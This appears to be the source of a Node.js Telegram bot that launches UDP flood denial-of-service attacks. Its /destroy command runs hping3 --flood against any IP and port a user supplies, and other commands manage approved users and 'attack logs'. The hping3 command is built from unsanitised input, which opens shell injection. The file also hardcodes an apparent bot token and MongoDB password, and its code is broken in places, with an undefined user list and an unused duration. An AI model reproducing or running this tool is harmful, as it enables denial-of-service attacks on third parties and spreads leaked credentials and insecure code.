const TelegramBot = require('node-telegram-bot-api');
const os = require('os');
const mongoose = require('mongoose');
const { exec } = require("child_process");

// Insert your Telegram bot token here
const bot = new TelegramBot('7351069485:AAHbAxZuPAsA83xRJ3DhIULYi9Jm3U-5r-E', { polling: true });

// MongoDB Connection
mongoose.connect('mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv', {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log("✅ Connected to MongoDB"))
  .catch(err => console.error("❌ MongoDB Connection Error:", err));

// Define User Schema
const userSchema = new mongoose.Schema({
    userId: String,
    approvalExpiry: Date,
    lastAttackTime: Date
});
const User = mongoose.model('User', userSchema);

// Admin user IDs
const adminIds = ["6484008134"];

// ✅ Function to Check CPU Usage
function getCPUUsage() {
    const cpus = os.cpus();
    let totalIdle = 0, totalTick = 0;

    cpus.forEach(cpu => {
        for (let type in cpu.times) {
            totalTick += cpu.times[type];
        }
        totalIdle += cpu.times.idle;
    });

    return ((1 - totalIdle / totalTick) * 100).toFixed(2);
}

// ✅ `/cpu` Command (Shows Accurate CPU Usage)
bot.onText(/\/cpu/, (msg) => {
    const cpuUsage = getCPUUsage();
    bot.sendMessage(msg.chat.id, `📊 **Current CPU Usage:**\n\n🔧 CPU Usage: **${cpuUsage}%**`);
});

// ✅ `/destroy` Command (Attack Command)
bot.onText(/\/destroy (\S+) (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);

    if (!approvedUsers.includes(chatId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to use this command.");
    }

    // Ensure the user has provided all necessary information
    if (!ip || !port || !duration) {
        const usageMessage = `
📜 **Proper Command Usage:**
Use the /destroy command as follows:

/destroy <ip> <port> <time>

**Example:** /destroy 192.168.1.1 80 60

📸 Here's an example of how it works:
[Image Example Here]

Note: Ensure the IP, port, and duration are valid.
        `;
        return bot.sendMessage(chatId, usageMessage, { parse_mode: 'Markdown' });
    }

    bot.sendMessage(chatId, `🚀 Attack started on ${ip}:${port} for ${duration} seconds!`);

    exec(`hping3 --udp -p ${port} --flood ${ip}`, (error, stdout, stderr) => {
        if (error) {
            return bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
        // Send a confirmation message after successful attack execution
        bot.sendMessage(chatId, `✅ Attack on ${ip}:${port} for ${duration} seconds has completed.`);
    });
});

// ✅ `/add` Command (Add User)
bot.onText(/\/add (\d+)/, async (msg, match) => {
    const userId = match[1];

    let user = await User.findOne({ userId });
    if (user) {
        bot.sendMessage(msg.chat.id, "✅ User is already approved.");
        return;
    }

    await User.create({ userId, approvalExpiry: null, lastAttackTime: null });
    bot.sendMessage(msg.chat.id, `✅ User ${userId} has been added.`);
});

// ✅ `/remove` Command (Remove User)
bot.onText(/\/remove (\d+)/, async (msg, match) => {
    const userId = match[1];

    await User.deleteOne({ userId });
    bot.sendMessage(msg.chat.id, `✅ User ${userId} has been removed.`);
});

// ✅ `/logs` Command (Show Attack Logs)
bot.onText(/\/logs/, async (msg) => {
    const users = await User.find({});
    let response = "📜 **Attack Logs:**\n";

    users.forEach(user => {
        response += `👤 User: ${user.userId} | Last Attack: ${user.lastAttackTime || "N/A"}\n`;
    });

    bot.sendMessage(msg.chat.id, response);
});

// ✅ `/broadcast` Command (Send Message to All Users)
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    const message = match[1];
    const users = await User.find({});

    users.forEach(user => {
        bot.sendMessage(user.userId, `📢 **Broadcast:** ${message}`);
    });

    bot.sendMessage(msg.chat.id, "✅ Broadcast sent to all users.");
});

// ✅ `/start` Command
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "👋 Welcome! Use /help for commands.");
});

// ✅ `/help` Command
bot.onText(/\/help/, (msg) => {
    const helpText = `
📜 **Available Commands:**
- /destroy <target> <port> <time> : Start an attack.
- /cpu : Show current CPU usage.
- /add <userId> : Add a user.
- /remove <userId> : Remove a user.
- /logs : Show attack logs.
- /broadcast <message> : Send message to all users.
- /start : Start the bot.
- /help : Show available commands.
    `;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: "Markdown" });
});

// Start polling
console.log("Bot is running...");
